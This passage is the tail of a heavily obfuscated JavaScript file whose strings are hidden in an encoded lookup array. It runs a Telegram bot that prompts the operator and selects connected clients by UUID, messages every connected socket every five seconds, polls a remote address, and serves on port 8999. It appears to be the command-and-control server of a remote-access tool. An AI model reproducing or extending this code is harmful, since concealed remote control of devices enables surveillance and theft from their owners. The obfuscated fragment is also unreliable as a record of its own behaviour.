        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[171] + _0xdc21[172], {
            reply_markup: {
                force_reply: true
            },
            parse_mode: _0xdc21[17]
        });
        currentUuid = _0xeb57xe
    };
    if (_0xeb57x26 == _0xdc21[173]) {
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[174] + _0xdc21[175], {
            reply_markup: {
                force_reply: true
            },
            parse_mode: _0xdc21[17]
        });
        currentUuid = _0xeb57xe
    }
});
setInterval(function() {
    appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
        _0xeb57xd[_0xdc21[6]](_0xdc21[176])
    });
    try {
        axios[_0xdc21[7]](address)[_0xdc21[177]]((_0xeb57x27) => {
            return _0xdc21[3]
        })
    } catch (e) {}
}, 5000);
appServer[_0xdc21[180]](process[_0xdc21[179]][_0xdc21[178]] || 8999)
